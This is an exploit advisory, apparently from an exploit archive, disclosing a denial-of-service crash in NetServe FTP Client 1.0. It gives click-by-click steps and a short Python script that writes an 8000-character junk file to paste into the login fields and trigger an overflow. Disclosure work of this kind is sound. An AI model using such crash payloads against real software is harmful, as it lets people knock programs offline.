@@ -1,0 +1,30 @@
+********************************************************************************************
+# Exploit Title: NetServe FTP Client 1.0 DOS (Overflow).
+# Date: 8/12/2015
+# Exploit Author: Un_N0n
+# Software Link:  http://netserve-ftp-client.en.softonic.com/
+# Version: Version 1.0.0 
+# Tested on: Windows 7 x64(64 BIT)
+********************************************************************************************
+
+[Steps to Produce the Crash]:
+1- Open up NetServeFTPClient.exe
+2- Click on 'Site List'.
+3- Select any Directory and Click on NEW.
+4- In the Fields like NAME, FTP_PATH, Username, Password Paste in the Junk Produced by PY script given Below.
+Program will crash saying 'Run Time Error (6), Overflow'.
+
+[Reason?]
+Acc to MSDN:"An overflow results when you try to make an assignment that exceeds the limitations of the target of the assignment."
+REF for More Info: https://msdn.microsoft.com/en-us/library/aa264525(v=vs.60).aspx
+
+
+[Code to produce evil bleh.txt ;)]: 
+data = "\x41" * 8000
+file = open("bleh.txt","w")
+file.write(data)
+file.close()
+
+[Link for Software: ]
+http://netserve-ftp-client.esoftfinder.com/download/
+**********************************************************************************************************************************************
